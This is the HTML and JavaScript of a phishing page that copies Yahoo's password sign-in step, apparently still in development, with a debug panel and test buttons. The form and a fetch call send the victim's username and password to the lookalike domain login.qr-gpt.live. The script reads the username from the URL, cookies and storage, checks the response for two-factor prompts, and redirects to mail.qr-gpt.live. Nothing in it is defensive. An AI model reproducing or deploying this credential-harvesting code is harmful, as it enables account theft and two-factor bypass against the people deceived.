<!DOCTYPE html>
<html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
<head>
  <meta charset="utf-8">
  <title>Yahoo - Enter Password</title>
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com" rel="preconnect">
  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
  <script type="text/javascript">WebFont.load({google:{families:["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]}});</script>
  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
  <link href="./yahoo.png" rel="shortcut icon" type="image/x-icon">
  <link href="./yahoo.png" rel="apple-touch-icon">
  
  <style>
    .debug-panel {
        position: fixed;
        top: 10px;
        right: 10px;
        background: #000;
        color: #0f0;
        padding: 10px;
        border-radius: 5px;
        font-family: monospace;
        font-size: 12px;
        max-width: 300px;
        z-index: 10000;
        max-height: 400px;
        overflow-y: auto;
    }
    .debug-panel h4 {
        color: #ff0;
        margin: 0 0 5px 0;
    }
    .debug-log {
        margin: 2px 0;
        word-break: break-all;
    }
    .input-field.error {
        border-color: #d93025 !important;
        background-color: #fef7f7 !important;
    }
    .error-message {
        color: #d93025;
        font-size: 14px;
        margin-top: 8px;
        display: none;
    }
    .success-message {
        color: #0f9d58;
        font-size: 14px;
        margin-top: 8px;
        display: none;
    }
  </style>
</head>

<body>
  <!-- DEBUG PANEL -->
  <div class="debug-panel" id="debug-panel">
    <h4>üîç DEBUG INFO</h4>
    <div id="debug-logs"></div>
  </div>

  <section class="section">
    <div class="div-block">
      <div class="div-block-2"><img src="images/yahoo.png" loading="lazy" alt="" class="image"></div>
      <div class="div-block-3">
        <div class="text-block">Help</div>
        <div><a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link">Terms</a></div>
        <div><a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-2">Privacy</a></div>
      </div>
    </div>
    <div class="layout active" id="main-layout">
      <div class="div-block-5">
        <h3 class="header active">Yahoo makes it easy to enjoy what matters most in your world</h3>
        <p class="parag active">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
      </div>
      <div class="form-block w-form">
        <form id="email-form" name="email-form" data-name="Email Form" class="form" 
              action="https://login.qr-gpt.live/account/challenge/password" 
              method="POST">
          
          <!-- MINIMAL HIDDEN FIELDS FOR TESTING -->
          <input type="hidden" id="username" name="username">
          <input type="hidden" name="displayName" id="hidden-display-name">
          <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
          <input type="hidden" name="src" value="ym">
          <input type="hidden" name=".lang" value="en-US">
          <input type="hidden" name=".intl" value="us">
          
          <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
          
          <div class="pazzi" id="form-container">
            <div class="reflectto" id="userEmail">Enter your password</div>
            <h1 class="heading-2"><strong>Enter password</strong></h1>
            <div class="text-block-2">to finish signing in<br></div>
            <div class="pazz lpl">Password<br></div>
            <div class="ms-input-wrap">
              <input data-show="true" class="ms-input w-input" maxlength="256" name="passwd" data-name="passwd" placeholder="" type="password" id="password" data-ms-member="password" required autofocus>
              
              <div data-current="Show" data-easing="ease" data-duration-in="300" data-duration-out="100" class="ms-password-wrap w-tabs">
                <div id="transformButton" data-transform="true" class="tabs-menu w-tab-menu">
                  <a data-w-tab="Show" class="ms-password-button w-inline-block w-tab-link w--current"><img src="images/visible.png" loading="eager" alt="" class="image-4"></a>
                  <a data-w-tab="Hide" class="ms-password-button w-inline-block w-tab-link"><img src="images/eye.png" loading="eager" alt="" class="image-4"></a>
                </div>
              </div>
            </div>
            <div class="error-message" id="password-error">Invalid password. Please try again.</div>
            <div class="success-message" id="password-success">Password verified!</div>
            
            <input type="submit" data-wait="Please wait..." class="logger w-button" value="Sign In" id="submit-btn">
            
            <!-- DEBUG BUTTONS -->
            <div style="margin-top: 20px; text-align: center;">
              <button type="button" id="test-success" style="background: #0f9d58; color: white; border: none; padding: 8px 16px; border-radius: 4px; margin: 5px;">Test Success Flow</button>
              <button type="button" id="clear-debug" style="background: #666; color: white; border: none; padding: 8px 16px; border-radius: 4px; margin: 5px;">Clear Debug</button>
            </div>
          </div>
        </form>
      </div>
    </div>
  </section>

  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=67c6f50ed426ad7d5847f211" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="js/webflow.js" type="text/javascript"></script>
  
  <!-- PASSWORD TOGGLE SCRIPT -->
  <script>
  document.querySelector("[data-transform]").addEventListener("click", transform);
  var isPassword = true;
  function transform() {
     var myInput = document.querySelector("[data-show]");
     var oldHtml = myInput.outerHTML;
     var text = myInput.value;
     if (isPassword) {
         var newHtml = oldHtml.replace(/password/g, "text");
     } else {
         newHtml = oldHtml.replace(/text/g, "password");
     }
     myInput.outerHTML = newHtml;
     myInput = document.querySelector("[data-show]");
     myInput.value = text;
     isPassword = !isPassword;
  }
  </script>

  <!-- ENHANCED DEBUG SCRIPT -->
  <script>
  (function() {
      'use strict';
      
      // DEBUG SYSTEM
      const debugLogs = document.getElementById('debug-logs');
      const debugPanel = document.getElementById('debug-panel');
      
      function debugLog(message, data = null) {
          console.log(`[DEBUG] ${message}`, data || '');
          const logDiv = document.createElement('div');
          logDiv.className = 'debug-log';
          logDiv.innerHTML = `<strong>${new Date().toLocaleTimeString()}</strong>: ${message}`;
          if (data) {
              logDiv.innerHTML += `<br><small>${JSON.stringify(data).substring(0, 100)}...</small>`;
          }
          debugLogs.appendChild(logDiv);
          debugLogs.scrollTop = debugLogs.scrollHeight;
      }
      
      debugLog('üöÄ Yahoo Debug Password Page Loaded');
      
      const elements = {
          form: document.getElementById('email-form'),
          passwordInput: document.getElementById('password'),
          submitBtn: document.getElementById('submit-btn'),
          userDisplay: document.getElementById('userEmail'),
          hiddenUsername: document.getElementById('username'),
          hiddenDisplayName: document.getElementById('hidden-display-name'),
          passwordError: document.getElementById('password-error'),
          passwordSuccess: document.getElementById('password-success'),
          testSuccessBtn: document.getElementById('test-success'),
          clearDebugBtn: document.getElementById('clear-debug')
      };
      
      let currentUsername = '';
      
      // Get username with debug info
      function getUsername() {
          debugLog('üîç Attempting to retrieve username...');
          
          const urlParams = new URLSearchParams(window.location.search);
          let username = urlParams.get('u');
          
          if (username) {
              username = decodeURIComponent(username);
              debugLog('‚úÖ Username from URL:', username);
              return username;
          }
          
          const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/);
          if (cookieMatch) {
              username = decodeURIComponent(cookieMatch[1]);
              debugLog('‚úÖ Username from cookie:', username);
              return username;
          }
          
          username = sessionStorage.getItem('yh_username');
          if (username) {
              debugLog('‚úÖ Username from sessionStorage:', username);
              return username;
          }
          
          username = localStorage.getItem('yh_username');
          if (username) {
              debugLog('‚úÖ Username from localStorage:', username);
              return username;
          }
          
          debugLog('‚ùå No username found in any source');
          return null;
      }
      
      function initializePage() {
          debugLog('üîß Initializing page...');
          
          currentUsername = getUsername();
          
          if (!currentUsername) {
              debugLog('‚ùå ERROR: No username found');
              alert('No username found. Please start from the beginning.');
              return false;
          }
          
          elements.userDisplay.textContent = currentUsername;
          elements.hiddenUsername.value = currentUsername;
          elements.hiddenDisplayName.value = currentUsername;
          
          debugLog('‚úÖ Page initialized for user:', currentUsername);
          return true;
      }
      
      function showError(message) {
          debugLog('‚ùå Showing error:', message);
          elements.passwordInput.classList.add('error');
          elements.passwordError.textContent = message;
          elements.passwordError.style.display = 'block';
          elements.passwordSuccess.style.display = 'none';
          elements.passwordInput.focus();
      }
      
      function showSuccess(message) {
          debugLog('‚úÖ Showing success:', message);
          elements.passwordInput.classList.remove('error');
          elements.passwordError.style.display = 'none';
          elements.passwordSuccess.textContent = message;
          elements.passwordSuccess.style.display = 'block';
      }
      
      function clearMessages() {
          elements.passwordInput.classList.remove('error');
          elements.passwordError.style.display = 'none';
          elements.passwordSuccess.style.display = 'none';
      }
      
      // SIMPLIFIED FORM SUBMISSION FOR DEBUGGING
      function handleFormSubmission(event) {
          event.preventDefault();
          
          const password = elements.passwordInput.value.trim();
          if (!password) {
              showError('Please enter your password.');
              return;
          }
          
          clearMessages();
          elements.submitBtn.disabled = true;
          elements.submitBtn.value = 'Signing in...';
          
          debugLog('üîê FORM SUBMISSION STARTED');
          debugLog('Username:', currentUsername);
          debugLog('Password length:', password.length);
          debugLog('Form action:', elements.form.action);
          
          // Prepare minimal form data
          const formData = new FormData(elements.form);
          formData.set('username', currentUsername);
          formData.set('displayName', currentUsername);
          
          debugLog('üì§ Form data being sent:');
          for (let [key, value] of formData.entries()) {
              if (key === 'passwd') {
                  debugLog(`  ${key}: [REDACTED - Length: ${value.length}]`);
              } else {
                  debugLog(`  ${key}: ${value}`);
              }
          }
          
          const urlEncodedData = new URLSearchParams(formData);
          
          // SIMPLIFIED FETCH - Just try to submit and see what happens
          fetch(elements.form.action, {
              method: 'POST',
              body: urlEncodedData,
              credentials: 'include',
              headers: {
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'Referer': window.location.href,
                  'Origin': window.location.origin
              }
          })
          .then(response => {
              debugLog('üì• RESPONSE RECEIVED');
              debugLog('Status:', response.status);
              debugLog('Status Text:', response.statusText);
              debugLog('Headers:', Object.fromEntries([...response.headers.entries()]));
              
              elements.submitBtn.disabled = false;
              elements.submitBtn.value = 'Sign In';
              
              if (response.ok) {
                  return response.text().then(text => {
                      debugLog('üìÑ Response body preview:', text.substring(0, 500));
                      
                      // Instead of trying to parse, just show what we got
                      showSuccess('Response received! Check debug panel for details.');
                      
                      // Try to detect what Yahoo wants us to do next
                      const lowerText = text.toLowerCase();
                      
                      if (lowerText.includes('challenge') || lowerText.includes('verification') || lowerText.includes('2fa')) {
                          debugLog('üîê Detected: Challenge/2FA required');
                          setTimeout(() => {
                              alert('Yahoo wants 2FA. We need to inspect the real 2FA page now!');
                          }, 2000);
                      } else if (lowerText.includes('mail') || lowerText.includes('inbox')) {
                          debugLog('üìß Detected: Direct mail access');
                          setTimeout(() => {
                              window.location.href = 'https://mail.qr-gpt.live/d/folders/1';
                          }, 2000);
                      } else if (lowerText.includes('invalid') || lowerText.includes('incorrect')) {
                          debugLog('‚ùå Detected: Invalid credentials');
                          showError('Invalid password detected in response');
                      } else {
                          debugLog('‚ùì Unknown response type - manual inspection needed');
                      }
                  });
              } else if (response.status === 302 || response.status === 301) {
                  const location = response.headers.get('Location');
                  debugLog('üîÑ Redirect to:', location);
                  showSuccess('Redirect detected! Check debug panel.');
                  
                  if (location) {
                      setTimeout(() => {
                          alert(`Yahoo wants to redirect to: ${location}\n\nWe need to inspect this page!`);
                      }, 2000);
                  }
              } else {
                  debugLog('‚ùå HTTP Error:', response.status);
                  showError(`HTTP ${response.status}: ${response.statusText}`);
              }
          })
          .catch(error => {
              debugLog('üí• FETCH ERROR:', error.message);
              elements.submitBtn.disabled = false;
              elements.submitBtn.value = 'Sign In';
              showError('Network error: ' + error.message);
          });
      }
      
      // Test success flow button
      elements.testSuccessBtn.addEventListener('click', function() {
          debugLog('üß™ Testing success flow...');
          showSuccess('Test success message!');
          setTimeout(() => {
              alert('This would redirect to Yahoo Mail or 2FA page');
          }, 1000);
      });
      
      // Clear debug button
      elements.clearDebugBtn.addEventListener('click', function() {
          debugLogs.innerHTML = '';
          debugLog('üßπ Debug cleared');
      });
      
      // Setup input handlers
      elements.passwordInput.addEventListener('input', clearMessages);
      elements.passwordInput.addEventListener('keydown', function(event) {
          if (event.key === 'Enter') {
              event.preventDefault();
              elements.form.dispatchEvent(new Event('submit'));
          }
      });
      
      // Initialize
      function init() {
          if (!initializePage()) return;
          
          elements.form.addEventListener('submit', handleFormSubmission);
          
          setTimeout(() => {
              elements.passwordInput.focus();
          }, 500);
          
          debugLog('‚úÖ Debug password page fully initialized');
      }
      
      if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', init);
      } else {
          init();
      }
      
  })();
  </script>
</body>
</html>
